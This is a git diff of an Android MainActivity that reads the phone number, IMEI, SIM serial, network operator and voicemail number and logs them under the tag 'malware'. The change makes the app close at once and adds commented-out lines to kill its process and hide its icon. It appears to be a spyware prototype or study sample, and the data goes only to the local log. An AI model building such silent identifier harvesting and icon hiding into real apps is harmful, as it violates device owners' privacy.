@@ -1,18 +1,21 @@
 package ommrepublic.com.ledieo;
 
+import android.app.Activity;
 import android.support.v7.app.ActionBarActivity;
 import android.os.Bundle;
+import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 
 
-public class MainActivity extends ActionBarActivity {
+public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
 
         Log.d("malware", "Call me anytime, my number is " + PhoneInfo.getMyPhoneNumber(this));
         Log.d("malware", "IMEI " + PhoneInfo.getMyIMEI(this));
@@ -20,6 +23,9 @@ public class MainActivity extends ActionBarActivity {
         Log.d("malware", "Network operator " + PhoneInfo.getMyNetworkOperator(this));
         Log.d("malware", "SIM-Serial " + PhoneInfo.getMySIMSerial(this));
         Log.d("malware", "Voice number " + PhoneInfo.getMyVoiceMailNumberI(this));
+        //android.os.Process.killProcess(android.os.Process.myPid());
+        //Utils.hideAppIcon(MainActivity.this);
+        finish();
     }
 
     @Override
